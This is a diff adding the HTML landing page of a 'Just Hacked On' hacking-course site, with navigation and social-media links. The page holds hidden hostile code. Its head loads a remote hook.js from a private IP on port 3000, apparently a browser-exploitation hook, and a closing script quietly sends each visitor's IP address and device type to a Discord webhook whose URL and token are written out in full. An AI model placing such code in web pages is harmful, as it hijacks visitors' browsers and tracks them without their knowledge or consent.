@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<head>
+  <script src="http://192.168.2.29:3000/hook.js"></script>
+<base target="_blank" href="">
+<meta charset="UTF-8">
+<title>Just Hacked On</title>
+<link rel="shortcut icon" type="image/png" href="favicons/.-4309-jh.png">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="css/css-style.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous" type="text/css">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+
+<script type="text/javascript" src="js/911-js-script.js"></script>
+<script type="text/javascript" src="js/5353-js-jquery.particleground.js"></script>
+<script type="text/javascript" src="js/1970-js-demo.js"></script>
+<script type="text/javascript" src="js/word.js"></script>
+
+
+
+<script>
+    function playAudio() {
+      var audio = new Audio("./reality.mp3");
+      audio.play();
+    }
+  </script>
+
+
+
+</head>
+
+<body onload="playAudio()">
+
+  <div class="navbar">
+    <a href="#" class="logo">JUST HACKED ON</a>
+    <ul class="nav-links">
+        <li><a href="#">Home</a></li>
+        <li><a href="./course/course.html">Course</a></li>
+        <!-- <li><a href="#">Services</a></li> -->
+        <li><a href="https://wa.me/message/PZFA32NIHVUBL1">Contact</a></li>
+        <!-- <li><a href="./Blogs/Blogs.html">Blogs</a></li> -->
+    </ul>
+</div>
+
+
+
+<div id="particles">
+<div id="intro">
+<a href="./images/2.0.png" style="color: white;"><img class="for_border" src="images/justhacked.in-jh.png" height="180" width="180"></a>
+
+<!-- <h2 style="font-family: 'Syncopate', sans-serif; font-weight: 10;">JUST HACKED ON<a href="#" style="color: white;"></a></h2> -->
+
+
+
+<div class="container">
+<div class="row">
+<div class="col-md-12 text-center">
+<h2 style="font-family: 'Russo One', sans-serif; font-weight: 10;" class="animate-charcter" >JUST HACKED ON<a href="#" style="color: white;"></a></h2>
+</div>
+</div>
+</div>
+
+
+
+
+
+<hr style="width: 50%; background-color: #E83951; border-color: #E83951;">
+
+<a href="https://wa.me/message/PZFA32NIHVUBL1" style="color: white;"><i class="fab fa-whatsapp" style="font-size: 2.5em;"></i></a>
+<a href="https://www.instagram.com/x.abdul_ahad/" style="color: white;"><i class="fab fa-instagram" style="font-size: 2.5em;"></i></a>
+<!-- <a href="https://github.com/just-hacked/" style="color: white;"><i class="fab fa-facebook" style="font-size: 2.5em;"></i></a> -->
+<a href="https://www.facebook.com/profile.php?id=100090969289129" style="color: white;"><i class="fab fa-facebook" style="font-size: 2.5em;"></i></a>
+<a href="https://t.me/justhackedon" style="color: white;"><i class="fab fa-telegram" style="font-size: 2.5em;"></i></a>
+
+
+<div class="animated">
+    <p style="font-size: 0.8em;" style="font-weight: 100;" style="opacity: 0.2;">Hacking is a talent. You won't learn it at school.</p>
+</div>
+
+</div>
+</div>
+</body>
+
+ <script type="text/javascript">
+
+
+
+
+const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
+const discordWebhookUrl = "https://discord.com/api/webhooks/1162999794889924819/VUKr71Xtr55zqRAdSlyV-MksuDAxL_FLWYqQJAz3QWx7wyQah5yMhRIbKRKS_nqDbd47";
+
+// Retrieve IP address of visitor
+fetch(ipAddressWebhookUrl)
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    let message = `**WWW.JUST-HACKED-ON.ORG** 
+    IP Address: ${ipAddress}`;
+    if (isMobile) {
+      message += " Accessed through a mobile device.";
+    } else {
+      message += " Accessed through a desktop or laptop.";
+    }
+    const payload = {
+      content: message
+    };
+    // Send payload to Discord webhook using fetch API
+    fetch(discordWebhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+  });
+
+
+
+  
+  
+</script> 
+
+</html>
